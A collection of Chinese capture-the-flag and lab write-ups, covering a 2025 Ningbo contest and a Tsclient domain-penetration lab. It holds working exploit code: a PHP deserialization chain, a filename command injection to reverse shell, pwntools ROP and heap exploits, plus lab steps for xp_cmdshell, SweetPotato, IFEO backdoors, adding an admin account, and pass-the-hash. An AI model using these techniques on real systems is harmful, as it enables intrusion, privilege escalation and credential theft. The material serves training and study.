[{"title":"2025宁波市第八届网络安全大赛决赛wp","url":"/posts/310e5a1e/","content":"\n队友太强了，break rank1，fix rank4\n\n# [web] easyUpload\n\n\n## break\n\nF12检查图片，发现通过`/show.php?file=img/1.png`来读取\n\n任意文件读取，flag被ban，读index.php源码\n\n```php\n<?php\n// 启动 session\nsession_start();\n\nClass Dog {\n    public $bone;\n    public $meat;\n    public $beef;\n    public $candy;\n    public function __invoke() {\n        if ((md5($this->meat) == md5($this->beef)) && ($this->meat != $this->beef)) {\n            return $this->candy->flag;\n        }\n    }\n\n    public function __toString() {\n        $function = $this->bone;\n        return $function();\n    }\n}\n\nCLass mouse {\n    public $rice;\n\n    public function __get($key) {\n        @eval($this->rice);\n    }\n}\n\nclass Cat {\n    public $fish;\n    public function __construct() {\n    }\n\n    public function __destruct() {\n        echo $this->fish;\n    }\n}\n\n// 处理文件上传\n$message = '';\n$success = false;\nif ($_SERVER['REQUEST_METHOD'] === 'POST') {\n    if (isset($_FILES['uploaded_file'])) {\n        $uploadDir = __DIR__ . '/uploads/';\n        $uploadedFile = $uploadDir . basename($_FILES['uploaded_file']['name']);\n\n        if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $uploadedFile)) {\n            $message = '上传成功！';\n            $success = true;\n\n            $fileContent = file_get_contents($uploadedFile);\n            @unlink($uploadedFile);\n\n            @unserialize($fileContent);\n            $fileContent = \"\";\n\n            // 设置 session，表示上传成功\n            $_SESSION['upload_success'] = true;\n\n            // 重定向，防止刷新页面时重复提交表单\n            header(\"Location: \" . $_SERVER['PHP_SELF']);\n            echo $message;\n            exit();\n        }\n    }\n}\n?>\n<!DOCTYPE html>\n<html lang=\"zh-CN\">\n...\n</html>\n```\n\n反序列化，经过一个md5绕过\n\n```php\n<?php\n// 启动 session\nsession_start();\n\nClass Dog {\n    public $bone;\n    public $meat;\n    public $beef;\n    public $candy;\n    public function __invoke() {\n        if ((md5($this->meat) == md5($this->beef)) && ($this->meat != $this->beef)) {\n            return $this->candy->flag;\n        }\n    }\n\n    public function __toString() {\n        $function = $this->bone;\n        return $function();\n    }\n}\n\nCLass mouse {\n    public $rice;\n\n    public function __get($key) {\n        @eval($this->rice);\n    }\n}\n\nclass Cat {\n    public $fish;\n    public function __construct() {\n    }\n\n    public function __destruct() {\n        echo $this->fish;\n    }\n}\n\n\n$a = new Cat();\n$a->fish = new Dog();\n$a->fish->bone = new Dog();\n$a->fish->bone->meat = 's878926199a';\n$a->fish->bone->beef = 's155964671a';\n$a->fish->bone->candy = new mouse();\n$a->fish->bone->candy->rice = \"system('cat /flag');\";\n\n\necho serialize($a);\n\n# O:3:\"Cat\":1:{s:4:\"fish\";O:3:\"Dog\":4:{s:4:\"bone\";O:3:\"Dog\":4:{s:4:\"bone\";N;s:4:\"meat\";s:11:\"s878926199a\";s:4:\"beef\";s:11:\"s155964671a\";s:5:\"candy\";O:5:\"mouse\":1:{s:4:\"rice\";s:20:\"system('cat /flag');\";}}s:4:\"meat\";N;s:4:\"beef\";N;s:5:\"candy\";N;}}\n```\n\n![](/img/wp/2025/ningbo-9.png)\n\n\n\n\n\n\n# [web] img2base64\n\n\n## break\n\n>小明打ctf上头了，发什么消息都用编码发送，于是他搭建了一个web服务用来将图片进行base64编码，粗心的小明没有考虑安全问题，你能帮他看看吗?\n\n平台给了源码\n\n```python\nimport os\nimport re\nimport subprocess\nfrom flask import Flask, request, render_template, jsonify\n\napp = Flask(__name__)\n\nUPLOAD_FOLDER = 'uploads/'\nif not os.path.exists(UPLOAD_FOLDER):\n    os.makedirs(UPLOAD_FOLDER)\n\napp.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER\ndef checkname(filename):\n\n    ILLEGAL_CHARACTERS = r\"[*=&\\\"%;<>iashto!@()\\{\\}\\[\\]_^`\\'~\\\\#]\"\n    noip = re.compile(r\"\\d+\\.\\d+\")\n    if re.search(ILLEGAL_CHARACTERS, filename):\n        return False\n    if \"..\" in filename :\n        return False\n    if(noip.findall(filename)):\n        return False\n\n\n@app.route('/')\ndef upload_form():\n    return render_template('upload.html')\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    if 'file' not in request.files:\n        return jsonify({\"error\": \"No file part in the request\"}), 400\n\n    file = request.files['file']\n    if file.filename == '':\n        return jsonify({\"error\": \"No file selected\"}), 400\n    if(checkname(file.filename)==False):\n        return jsonify({\"error\": \"Not hacking!\"}), 500\n    if file:\n        file_path = os.path.join(app.config['UPLOAD_FOLDER'], file.filename)\n        file.save(file_path)\n        result = subprocess.run(f\"cat {file_path} | base64\", shell=True, capture_output=True, text=True)\n        encoded_string = result.stdout.strip()\n        return jsonify({\n            \"filename\": file.filename,\n            \"base64\": encoded_string\n        })\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0',port=5000)\n```\n\n公告有提示反弹shell，那就先把反弹的命令写进文件\n\n![](/img/wp/2025/ningbo-10.png)\n\n代码执行的是`cat {file_path} | base64`\n\n先通过`|`截断命令，然后使用`$0`来执行 cat 输出的内容，也就是反弹shell的命令\n\n![](/img/wp/2025/ningbo-11.png)\n\n监听端口\n\n![](/img/wp/2025/ningbo-12.png)\n\n没权限读flag\n\n`sudo -l`查看有权限的命令，然后在GTFOBins查sudo语法\n\n>还好这题使用了简单的base64，不查也能试出来，但是如果是冷门或者比较复杂的就不行了，https://github.com/dr0n1/CTF_misc_auto_deploy 这个脚本可以在本地部署docker版GTFOBins\n\n![](/img/wp/2025/ningbo-13.png)\n\n\n# [web] genshop\n\n\n## fix\n\nssti的模板去掉直接过了\n\n```python\n# return render_template_string(f\"<h3>{result}</h3>\")\nreturn f\"<h3>{result}</h3>\"\n```\n\n\n\n# [web] Easy_shop\n\n等待队友补充\n\n## break\n\n\n## fix\n\n\n\n\n\n\n# [pwn] Cake_shop\n\n\n## break\n\n存在格式化字符串\n\n![](/img/wp/2025/ningbo-5.png)\n\nexp\n\n```python\nfrom pwn import *\ndef nothing(data):\n  p.sendlineafter(b'choice>>',b'4')\n  p.sendlineafter(b'happens',data)\n\ndef buy(num,data):\n  p.sendlineafter(b'choice>>',b'1')\n  p.sendlineafter(b'cake $100',str(num).encode())\n  p.sendlineafter(b'shop',data)\n\np=remote('10.1.108.15',9999)\npayload=b\"aaa%15$p %13$p %17$pbbb\"\nnothing(payload)\np.readuntil(b'aaa')\nd0,d1,d2=p.readuntil(b'bbb',drop=1).split(b' ')\nelf_addr=int(d1,16)\nlibc_addr=int(d2,16)\ne=ELF(\"./pwn\")\ne.address=elf_addr-0x156a\nlibc=ELF('./libc.so.6')\nlibc.address=libc_addr-0x24083\n\nindex=3+6\na_addr=0x4010+e.address\npayload=\"%\"+str(0xe0ff)+\"c%9$hn%\"+str(0x10000-0xe0ff+0x5f5)+\"c%10$hn\"\npayload=payload.ljust(24,'a').encode()\nprint(payload)\npayload+=p64(a_addr)+p64(a_addr+2)\nnothing(payload)\npayload=\"%25600c%9$n\".ljust(24,'a').encode()\npayload+=p64(0x4014+e.address)\nnothing(payload)\n\ncontext.log_level='debug'\nnum=666\np.sendlineafter(b'choice>>',b'1')\np.sendlineafter(b'cake $100',str(num).encode())\n\ncanary=int(d0,16)\nrdi=libc.address+0x23b6a\nret=rdi+1\nbin_sh=next(libc.search('/bin/sh\\x00'))\nsystem=libc.symbols['system']\npayload=b'a'*0x28+p64(canary)+p64(0xbfbfbfbf)\npayload+=p64(ret)+p64(rdi)+p64(bin_sh)+p64(system)\np.send(payload)\n\n\np.interactive()\n```\n\n## fix\n\n修改使用puts进行输出，成功修复\n\n![](/img/wp/2025/ningbo-6.png)\n\n\n\n\n# [pwn] stu_admin\n\n\n\n## fix\n\nedit功能存在堆溢出，溢出了16字节\n\n![](/img/wp/2025/ningbo-7.png)\n\n修复溢出\n\n![](/img/wp/2025/ningbo-8.png)\n\n\n\n\n# 总结\n\n整体难度比往年都要简单，就是搞不懂为什么check的轮次这么少，只有两轮","tags":["wp","宁波","awdp","2025竞赛"],"categories":["wp"]},{"title":"春秋云境 Tsclient","url":"/posts/51676235/","content":"\n\n依旧白嫖\n\n>Tsclient是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有3个flag，分布于不同的靶机。\n\n前置知识:\n\n[内网渗透学习(代理篇)](/posts/52375b43/)\n[域渗透学习(NTLM篇)](/posts/3f5b8fbe/)\n[windows提权笔记](/posts/a04618bd/)\n\n\n# 入口（172.22.8.18）\n\n访问主机，是一个iis页面，没有明显的框架和服务可以利用\n\n扫描端口\n\n`fscan.exe -h 39.99.147.95`\n\n开启了mssql服务，同时爆出了弱口令 sa/1qaz!QAZ\n\n![](/img/内网/ichunqiu/Tsclient-1.png)\n\nMDUT连接上，激活xpcmdshell组件执行命令，发现权限较低\n\n![](/img/内网/ichunqiu/Tsclient-2.png)\n\n\n上传 SweetPotato 提权\n\n![](/img/内网/ichunqiu/Tsclient-3.png)\n\n提权后上线cs\n\n![](/img/内网/ichunqiu/Tsclient-4.png)\n\n\n得到flag1：`flag{9147508f-baf0-4602-b4b2-3fe74b39fb86}`\n和一个hint：`Maybe you should focus on user sessions...`\n\n![](/img/内网/ichunqiu/Tsclient-5.png)\n\n# 内网\n\n然后收集信息\n\nip是172.22.8.18\n\n![](/img/内网/ichunqiu/Tsclient-6.png)\n\n还有一个用户john，恰巧在线\n\n>`quser || qwinst` 命令查看在线用户\n\n![](/img/内网/ichunqiu/Tsclient-7.png)\n\n根据提示使用cs的进程注入，上线John\n\n![](/img/内网/ichunqiu/Tsclient-8.png)\n\n查看网络连接状态\n\n![](/img/内网/ichunqiu/Tsclient-9.png)\n\n查看共享内容，得到一个密码和hint\n\n```text\nxiaorang.lab\\Aldrich:Ald@rLMWuy7Z!#\n\nDo you know how to hijack Image?\n```\n\n![](/img/内网/ichunqiu/Tsclient-10.png)\n\n\n\n\n这里为了操作方便创建了一个用户来远程登录windows\n\n```bash\nnet user dr0n1 Qwer1234! /add\nnet localgroup administrators dr0n1 /add\nREG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\n```\n\n上传fscan扫c段\n\n![](/img/内网/ichunqiu/Tsclient-11.png)\n\n\n```bash\n172.22.8.15:3389 open\n172.22.8.31:3389 open\n172.22.8.46:3389 open\n172.22.8.18:3389 open\n\n172.22.8.15 XIAORANG\\DC01 # 域控\n172.22.8.31 XIAORANG\\WIN19-CLIENT\n172.22.8.46 WIN2016.xiaorang.lab\n172.22.8.18 WIN-WEB # 本机\n```\n\n构建代理\n\n`C:\\a>iox.exe proxy -l 5588`\n\n\n## 域主机（172.22.8.46）\n\n这里主机不多，使用rdesktop一个一个尝试登录，登录46时会提示密码过期需要修改，改完就能登上了\n\n```bash\nproxychains4 rdesktop 172.22.8.46\n```\n\n```text\nxiaorang\\Aldrich\nAld@rLMWuy7Z!#\n```\n\n![](/img/内网/ichunqiu/Tsclient-13.png)\n\n---\n\n看网上的wp是说可以用crackmapexec喷洒密码\n\n`proxychains4 crackmapexec smb 172.22.8.0/24 -u 'Aldrich' -p 'Ald@rLMWuy7Z!#' -d xiaorang.lab 2>/dev/null`\n\n![](/img/内网/ichunqiu/Tsclient-12.png)\n\n然后有提示`STATUS_PASSWORD_EXPIRED` 就是密码过期了，需要使用[smbpasswd](https://github.com/fortra/impacket)进行修改密码\n\n`python3 smbpasswd.py xiaorang.lab/Aldrich:'Ald@rLMWuy7Z!#'@172.22.8.15 -newpass 'Qwer1234!'`\n\n---\n\n根据前面的提示 `hijack Image`\n\nrdp登上后先查看权限，发现所有正常登录的用户都可以修改注册表\n\n```\nget-acl -path \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\" | fl *\n```\n\n![](/img/内网/ichunqiu/Tsclient-14.png)\n\n\n修改注册表，把主页的放大镜(magnify.exe)替换成C:\\windows\\system32\\cmd.exe，这样就直接提权成system了\n\n```bash\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe\" /v Debugger /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\"\n\n# 粘滞键方式，五次shift触发\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\"\n```\n\n锁屏后点击右小角的放大镜\n\n![](/img/内网/ichunqiu/Tsclient-15.png)\n\n就直接是system权限了，然后触发提前准备好的马(cs 转发上线)\n\n![](/img/内网/ichunqiu/Tsclient-16.png)\n\n上线cs，拿到flag2\n\n![](/img/内网/ichunqiu/Tsclient-17.png)\n\n## 域控（172.22.8.15）\n\n查看域管成员\n\n```bash\nshell net group \"domain admins\" /domain\n```\n\n![](/img/内网/ichunqiu/Tsclient-18.png)\n\nlogonpaswords抓到win2016$的哈希\n\n```bash\nlogonpasswords\n```\n\n![](/img/内网/ichunqiu/Tsclient-19.png)\n\n\npth域控，拿到flag3\n\n```bash\nproxychains4 crackmapexec smb 172.22.8.15 -u WIN2016$ -H b3b4f52af6fdf3105ee5c04215755ff4 -d xiaorang -x \"type C:\\Users\\Administrator\\flag\\flag03.txt\"\n```\n\n![](/img/内网/ichunqiu/Tsclient-20.png)","tags":["内网渗透","春秋云境","专业徽章"],"categories":["内网渗透"]},{"title":"2025宁波市第八届网络安全大赛初赛wp","url":"/posts/1e3f469b/","content":"\n\n# misc\n\n## 吾的字节_1\n\n二维码图片等距提取像素点并将黑白转成10\n\n```python\nfrom PIL import Image\n\na = Image.open(\"five.png\")\nx_, y_ = 0, 0\nw, h = a.size\nb = Image.new(a.mode, (w // 10, h // 10))\n\nfor x in range(5, w, 10):\n    for y in range(5, h, 10):\n        pixel = a.getpixel((x, y))\n        b.putpixel((x_, y_), pixel)\n        y_ += 1\n    x_ += 1\n    y_ = 0\n\nb.save(\"1.png\")\n\n\n\n\ndef image_to_binary_string(image_path):\n    img = Image.open(image_path).convert(\"RGB\")\n    width, height = img.size\n\n    binary_str = \"\"\n    for y in range(height):\n        for x in range(width):\n            r, g, b = img.getpixel((x, y))\n            if (r, g, b) == (0, 0, 0):\n                binary_str += \"1\"\n            else:\n                binary_str += \"0\"\n    return binary_str\n\nbinary_str = image_to_binary_string(\"1.png\")\nprint(binary_str)\n```\n\n根据提示5个一组使用博多码解密\n\n```text\n IT WAS A 5-BIT CODE THAT BECAME KNOWN AS THE INTERNATIONAL TELEGRAPH ALPHABET NO 1 (ITA1). SMART YOU HAVE FOUND THIS PLACE AND THE FLAG IS JU5T-A-F1VE6IT-9AME\n```\n\n\n\n## Infinite_transformation\n\n压缩包注释\n\n```text\nboom!可能是6位吧\n密码拆开也许会有别的作用\n```\n\n爆破得到密码`121144`\n\n用rs打开vmdk文件\n\n![](/img/wp/2025/ningbo-1.png)\n\nctf.png 的777通道有另一张图片\n\n![](/img/wp/2025/ningbo-2.png)\n\n根据提示`也许有一只猫`，猜测是爆破参数的猫脸变换\n\n加上最开始提示的密码，猜测a和b的参数是121和144\n\n```python\nimport os\nimport cv2\nimport numpy as np\n\ndef de_arnold(img, shuffle_time, a, b):\n    r, c, d = img.shape\n    dp = np.zeros(img.shape, np.uint8)\n\n    for s in range(shuffle_time):\n        for i in range(r):\n            for j in range(c):\n                x = ((a * b + 1) * i - b * j) % r\n                y = (-a * i + j) % c\n                dp[x, y, :] = img[i, j, :]\n        img = np.copy(dp)\n    return img\n\n# 参数设置\na, b = 121, 144 # Arnold变换的参数\nmax_attempts = 100 # 爆破的最大尝试次数\noutput_dir = \"decrypted_images\"  # 输出文件夹\nos.makedirs(output_dir, exist_ok=True)\n\n# 读取加密图片\nimg_en = cv2.imread('1.png')\nif img_en is None:\n    raise FileNotFoundError(\"加密图片未找到，请检查路径和文件名是否正确。\")\n\n# 开始爆破\nfor shuffle_time in range(1, max_attempts + 1):\n    img_decrypted = de_arnold(img_en, shuffle_time, a, b)\n    output_path = os.path.join(output_dir, f\"flag_{shuffle_time}.png\")\n    cv2.imwrite(output_path, img_decrypted)\n    print(f\"解密图片已保存: {output_path}\")\n\nprint(f\"爆破完成，共生成 {max_attempts} 张解密图片，保存在文件夹: {output_dir}\")\n```\n\n![](/img/wp/2025/ningbo-4.png)\n\n\n另一部分flag.txt根据hint.txt中的提示`数字映射函数`使用Tupper自我指涉公式做出图像\n\n```python\nfrom functools import reduce\n\n\ndef Tuppers_Self_Referential_Formula():\n    k = 64302039943980618121484184873128503074609076299244422107146064367058121738007282650851520841656649070683123403821937513267391370346165645908933956953599129037238861474390287394253991334205788122863003605507035424785292830536282067025856204240859500900770386319047433635878298987553848841486636769829855797015618861382395619672208366605793866695702843978585628878996390708495917362310741277717465790690657480858197797078816624813513712771929056001109014477328987890335180242509040895793315048815591172058129474723554263040\n\n    def f(x, y):\n        d = ((-17 * x) - (y % 17))\n        e = reduce(lambda x, y: x * y, [2 for x in range(-d)]) if d else 1\n        g = ((y // 17) // e) % 2\n        return 0.5 < g\n\n    for y in range(k + 16, k - 1, -1):\n        line = \"\"\n        for x in range(0, 107):\n            if f(x, y):\n                line += \" ■\"\n            else:\n                line += \"  \"\n        print(line)\n\n\nif __name__ == '__main__':\n    Tuppers_Self_Referential_Formula()\n```\n\n![](/img/wp/2025/ningbo-3.png)\n\n\n# pwn\n\n## entity_cache\n\n存在uaf\n\n```python\nfrom pwn import *\nimport LibcSearcher\ndef add(ind,size,data=b'\\n'):\n    p.sendlineafter(b'Code: ',b'1')\n    p.sendlineafter(b'id >',str(ind).encode())\n    p.sendlineafter(b'size >',str(size).encode())\n    p.sendafter(b'fragment >',data)\n\ndef edit(ind,data):\n    p.sendlineafter(b'Code: ',b'2')\n    p.sendlineafter(b'id >',str(ind).encode())\n    p.sendafter(b'stream >',data)\n\ndef free(ind):\n    p.sendlineafter(b'Code: ',b'3')\n    p.sendlineafter(b'id >',str(ind).encode())\n\ndef show(ind):\n    p.sendlineafter(b'Code: ',b'4')\n    p.sendlineafter(b'id > ',str(ind).encode())\n\n\n#p=process('entity_cache')\np=remote('139.155.126.78','26428')\np.readuntil('[DEBUG INFO]')\ne=ELF('./entity_cache')\nlibc=ELF('./libc.so')\ne.address=int(p.readline(),16)-0xa1a\nprint(hex(e.address))\n\nsyscall=e.address+0xbcc\nadd(0,0xf0)\nadd(1,0xf0)\nadd(2,0xf0,'flag')\nadd(3,0xf0,'/flag')\nfree(0)\nfree(1)\nshow(1)\nheap0=u64(p.readuntil('\\n',drop=1).ljust(8,b'\\x00'))\nprint(hex(heap0))\nheap3=heap0+0x100*3\nheap2=heap0+0x100*2\n\nedit(1,p64(e.address+0x202060))\nadd(4,0xf0)\nadd(5,0xf0) # cache\nedit(5,p64(e.got['puts']))\nshow(0)\nputs=u64(p.readuntil('\\n',drop=1).ljust(8,b'\\x00'))\nprint(hex(puts))\nlibc.address=puts-libc.symbols['puts']\nenv=libc.symbols['environ']\n\nedit(5,p64(env))\nshow(0)\nstack=u64(p.readuntil('\\n',drop=1).ljust(8,b'\\x00')[:8])\nprint(hex(stack))\nedit(5,p64(stack-0x120+8*2))\nshow(0)\nstack1=u64(p.readuntil('\\n',drop=1).ljust(8,b'\\x00')[:8])\nprint(hex(stack1))\n\n\nmain_stack=stack-0x120+8*2\nedit(5,p64(main_stack))\n#gdb.attach(p)\npause()\n\nrdi=0x000000000002164f+libc.address\nrsi=0x0000000000023a6a+libc.address\nrdx=0x0000000000001b96+libc.address\nrax=0x000000000001b500+libc.address\npayload=b\"\"\npayload=p64(rax)+p64(2)+p64(rdi)+p64(heap3)+p64(rsi)+p64(0)+p64(rdx)+p64(0)+p64(syscall)\npayload+=p64(rax)+p64(0)+p64(rdi)+p64(3)+p64(rsi)+p64(heap2)+p64(rdx)+p64(0x50)+p64(syscall)\npayload+=p64(rax)+p64(1)+p64(rdi)+p64(1)+p64(rsi)+p64(heap2)+p64(rdx)+p64(0x50)+p64(syscall)\nprint(hex(len(payload)))\nedit(0,payload)\n\np.interactive()\n```\n\n\n# reverse\n\n\n## SEA_1\n\n伪代码：\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  size_t i; // [esp+190h] [ebp-268h]\n  int v5[72]; // [esp+19Ch] [ebp-25Ch] BYREF\n  char v6[44]; // [esp+2BCh] [ebp-13Ch] BYREF\n  char Buf1[136]; // [esp+2E8h] [ebp-110h] BYREF\n  char Str[132]; // [esp+370h] [ebp-88h] BYREF\n\n  __CheckForDebuggerJustMyCode(&unk_45A019);\n  memset(Str, 0, 0x80u);\n  memset(Buf1, 0, 0x80u);\n  sub_401E00(\"Please input the flag and I will verify it: \");\n  sub_401E70(\"%128s\", Str);\n  strcpy(v6, \"58453eec4d16ae234a10b597dfe1f6a6\");\n  if ( sub_4016B0(v5, v6, 256) )\n    return -1;\n  for ( i = 0; i < strlen(Str); i += 16 )\n  {\n    if ( sub_401410((int)v5, (int)&Buf1[i], &Str[i]) )\n      return -1;\n  }\n  if ( !memcmp(Buf1, &unk_458014, 0x30u) )\n    sub_401E00(\"Right flag!\\n\");\n  else\n    sub_401E00(\"Wrong flag\\n\");\n  return 0;\n}\n```\n\nAES加密，密钥是`58453eec4d16ae234a10b597dfe1f6a6`，密文是`unk_458014`，dump出来是`29708f1980cce40f46abac148d488ca83716fe1d397202797b1999166265623e8f761285cb28e256b381167761e41094`\n\ncyberchef解开：`DASCTF{75aab2560274ae21aa4554b993e658d1}`\n\n\n## flower_world\n\n1.txt\n\n```text\n  97704D -= 120;\n  977070 ^= 0x4Fu;\n  977055 -= 30;\n  977064 -= 93;\n  977048 += 95;\n  97704A += 103;\n  97705C ^= 0x82u;\n  977069 += 52;\n  97705E ^= 3u;\n  977041 += 71;\n  977076 ^= 0xE0u;\n  97706D -= 44;\n  977044 -= 127;\n  977075 -= 71;\n  977060 ^= 0xAAu;\n  97704E -= 119;\n  977062 ^= 0xAu;\n  97707D -= 48;\n  977075 += 55;\n  97705B += 111;\n  97706E ^= 0x32u;\n  97706C -= 92;\n  97705F ^= 0x29u;\n  977041 += 79;\n  97704A += 58;\n  977062 -= 17;\n  97705A += 123;\n  977075 -= 100;\n  97705C -= 64;\n  977056 -= 89;\n  977070 ^= 0x73u;\n  977062 ^= 0x61u;\n  97706E += 118;\n  977062 += 41;\n  977070 += 78;\n  977055 -= 11;\n  97704F ^= 0x5Eu;\n  977070 ^= 0xB2u;\n  977066 -= 66;\n  977046 ^= 0xECu;\n  977062 ^= 0xD1u;\n  977046 -= 99;\n  977069 -= 49;\n  977046 += 32;\n  977066 += 61;\n  977042 ^= 0x42u;\n  977055 += 109;\n  977070 += 14;\n  97707B -= 52;\n  97706E -= 94;\n  977074 += 57;\n  97705D -= 30;\n  97705E -= 107;\n  977048 += 55;\n  97704C -= 27;\n  97706F -= 88;\n  97707A -= 105;\n  977040 += 25;\n  97704C += 73;\n  97706F -= 80;\n  977070 += 125;\n  97706E -= 44;\n  97707A += 11;\n  977068 ^= 0x57u;\n  977062 += 117;\n  977056 += 92;\n  97705B ^= 0x7Au;\n  977043 += 33;\n  977045 ^= 0xC3u;\n  97705E += 19;\n  977064 -= 46;\n  977065 -= 45;\n  977067 ^= 0xB0u;\n  97704F -= 69;\n  977061 ^= 0xDCu;\n  977046 += 69;\n  97707E += 116;\n  97704B ^= 0x22u;\n  977063 ^= 0x7Eu;\n  977054 += 18;\n  977072 -= 11;\n  97704E ^= 5u;\n  97706E += 58;\n  977048 += 44;\n  97706D ^= 0xE4u;\n  977068 -= 30;\n  977063 += 96;\n  977047 -= 49;\n  977062 += 83;\n  97707A += 53;\n  97706A ^= 0x21u;\n  97707C += 49;\n  97705B += 11;\n  977070 -= 105;\n  977063 -= 47;\n  977073 -= 67;\n  977047 += 94;\n  97707E += 78;\n  97704F -= 96;\n  97707A ^= 0xD3u;\n  977043 += 115;\n  97705E -= 127;\n  97707A -= 86;\n  977074 += 32;\n  977067 ^= 0x5Cu;\n  977049 -= 64;\n  97706B ^= 0x8Eu;\n  97707E += 121;\n  977054 -= 98;\n  977074 ^= 0x22u;\n  97704F -= 12;\n  977045 ^= 0x2Du;\n  97707C -= 44;\n  97704D -= 74;\n  977061 ^= 0x82u;\n  977068 ^= 0xEDu;\n  977071 ^= 0xBEu;\n  977077 += 4;\n  97705E -= 120;\n  97704B += 67;\n  977072 -= 52;\n  977042 ^= 0x87u;\n  977067 -= 38;\n  97707B ^= 0xFAu;\n  977072 += 90;\n  97706E -= 9;\n  977077 ^= 0x2Fu;\n  977049 += 83;\n  97706B ^= 0xD6u;\n  977062 -= 6;\n  977048 -= 119;\n  977061 -= 118;\n  977062 -= 75;\n  977068 -= 52;\n  977040 -= 108;\n  97706A += 28;\n  97707C ^= 0x4Cu;\n  97706C ^= 0x4Au;\n  977061 ^= 0xFDu;\n  977063 += 125;\n  977041 ^= 0x6Cu;\n  977075 += 25;\n  977071 -= 7;\n  97707D -= 119;\n  97706F -= 16;\n  977064 += 53;\n  977066 ^= 0x56u;\n  977042 ^= 0xF2u;\n  97706B += 115;\n  977055 -= 37;\n  977072 -= 51;\n  977041 -= 107;\n  97704F -= 116;\n  97705C += 46;\n  977065 -= 67;\n  97704C += 113;\n  977061 += 114;\n  97704E += 69;\n  977060 += 99;\n  977064 ^= 0x88u;\n  977079 -= 37;\n  97705E ^= 0x76u;\n  977070 += 95;\n  97707A += 51;\n  977074 ^= 0xD3u;\n  97704F -= 86;\n  977040 -= 6;\n  97707C -= 8;\n  977071 ^= 0x30u;\n  97705B += 29;\n  977070 += 65;\n  97705D ^= 0xEEu;\n  977047 -= 31;\n  977061 -= 16;\n  977071 += 9;\n  977064 -= 46;\n  977049 ^= 0xDEu;\n  977054 ^= 0x6Du;\n  977065 -= 91;\n  977077 += 119;\n  97707D -= 8;\n  --977061;\n  977075 += 124;\n  977068 += 3;\n  977059 -= 22;\n  977060 ^= 0xD3u;\n  977072 ^= 0xA4u;\n  977040 ^= 0xA8u;\n  97707F += 50;\n  97707E ^= 0x4Du;\n  977070 += 60;\n  97704B += 49;\n  97707B += 3;\n  97706A -= 20;\n  977060 -= 38;\n  977063 -= 2;\n  97707B -= 108;\n  97707E -= 71;\n  97706E += 111;\n  977040 ^= 0xD9u;\n  97704E += 76;\n  97706F ^= 0xF6u;\n  97705B += 26;\n  977040 -= 27;\n  977060 -= 80;\n  977078 -= 27;\n  97705B += 7;\n  ++977073;\n  977075 ^= 0xDDu;\n  977043 -= 127;\n  977072 += 116;\n  977069 -= 70;\n  977065 ^= 0x9Bu;\n  977059 -= 34;\n  97704B -= 127;\n  97707F ^= 0xBu;\n  977058 -= 65;\n  97704B ^= 0x83u;\n  977059 ^= 0xB6u;\n  977067 -= 25;\n  977042 -= 94;\n  977061 ^= 0x7Eu;\n  977072 -= 69;\n  977077 -= 72;\n  977060 ^= 0xF7u;\n  977043 -= 11;\n  977069 ^= 0x64u;\n  977075 ^= 0xEu;\n  977073 -= 111;\n  977065 ^= 0x7Au;\n  97706B -= 7;\n  977060 += 103;\n  97707D ^= 0xF4u;\n  977077 += 16;\n  97705C ^= 0x89u;\n  977041 -= 20;\n  97707A ^= 0x3Fu;\n  97704D -= 31;\n  977073 += 98;\n  977073 -= 5;\n  977061 -= 30;\n  97704C += 73;\n  977054 -= 6;\n  977071 ^= 0x56u;\n  97705B ^= 3u;\n  977055 -= 119;\n  97706D += 37;\n  97705E += 4;\n  977044 -= 48;\n  977076 ^= 0xF4u;\n  977053 ^= 0x10u;\n  977059 ^= 0x47u;\n  977060 ^= 0xE2u;\n  97704E -= 16;\n  97705E ^= 0xD2u;\n  977042 += 70;\n  977060 -= 91;\n  977041 ^= 0x12u;\n  977042 -= 81;\n  977047 += 92;\n  977055 -= 77;\n  97705D ^= 0x7Du;\n  977070 ^= 0x4Au;\n  977074 -= 25;\n  977074 -= 127;\n  97704B += 121;\n  97706C += 64;\n  97707A ^= 0x58u;\n  97704B -= 123;\n  977078 += 42;\n  977071 -= 89;\n  97707E ^= 0x99u;\n  977043 -= 6;\n  977045 ^= 0x7Du;\n  977042 -= 14;\n  977064 += 96;\n  977058 += 26;\n  97706E += 54;\n  977052 -= 86;\n  97705D ^= 0x4Eu;\n  977055 -= 15;\n  977078 -= 32;\n  977057 += 75;\n  97706E += 66;\n  977053 += 101;\n  97705E -= 59;\n  97706B ^= 0xFAu;\n  977042 += 93;\n  977073 -= 123;\n  97707C += 31;\n  977064 ^= 0xA2u;\n  977073 -= 32;\n  97705A ^= 0x11u;\n  97707D += 121;\n  977074 -= 99;\n  977054 ^= 0x68u;\n  97706D -= 75;\n  977041 -= 117;\n  977043 += 92;\n  977041 += 88;\n  97704D -= 4;\n  977052 ^= 0x43u;\n  97704B += 8;\n  97706A -= 82;\n  977055 += 56;\n  977049 += 43;\n  977075 ^= 0xD1u;\n  97705D ^= 0x1Bu;\n  977052 -= 74;\n  97707B -= 104;\n  977073 -= 6;\n  977053 -= 120;\n  977043 -= 6;\n  977069 -= 2;\n  97705E ^= 0xFEu;\n  97707E ^= 0x45u;\n  977052 += 5;\n  977068 ^= 0x36u;\n  977051 -= 42;\n  977050 ^= 0xD6u;\n```\n\n```python\nd=open('1.txt').read().splitlines()\ndata=[ 0x7F, 0x11, 0x4A, 0x9D, 0xA5, 0xD5, 0x99, 0x9F, 0xAC, 0xD3, \n  0xD4, 0xBC, 0x1A, 0x53, 0x46, 0xF4, 0xE7, 0x37, 0x03, 0x60, \n  0x17, 0xBA, 0x67, 0xAC, 0x09, 0xDA, 0xA0, 0xFB, 0x2D, 0x8E, \n  